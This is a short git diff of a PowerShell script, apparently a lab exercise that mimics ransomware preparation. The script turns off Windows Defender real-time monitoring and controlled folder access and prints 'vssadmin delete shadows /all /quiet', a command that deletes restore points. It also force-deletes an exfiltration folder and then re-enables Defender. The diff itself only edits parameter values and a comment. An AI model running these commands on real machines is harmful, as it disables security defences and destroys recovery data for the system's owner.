@@ -6,10 +6,10 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 # also Disable the controlled folder access
 # if this is on, only trusted apps will be able to interact with some folders
-Set-MpPreference -EnableControlledFolderAccess $false
+Set-MpPreference -EnableControlledFolderAccess Disabled
 
 
-# Task 3 remove system restore points
+# Task 2 continued remove system restore points
 
 # this requries admin! for safty purposes, this is just printed to the screen
 Write-Output "vssadmin delete shadows /all /quiet"
@@ -53,4 +53,4 @@ Remove-Item -Path $exfil_path -Recurse -Force
 
 # now that we are done, turn defender back on
 Set-MpPreference -DisableRealtimeMonitoring $false
-Set-MpPreference -EnableControlledFolderAccess $true
+Set-MpPreference -EnableControlledFolderAccess Enabled
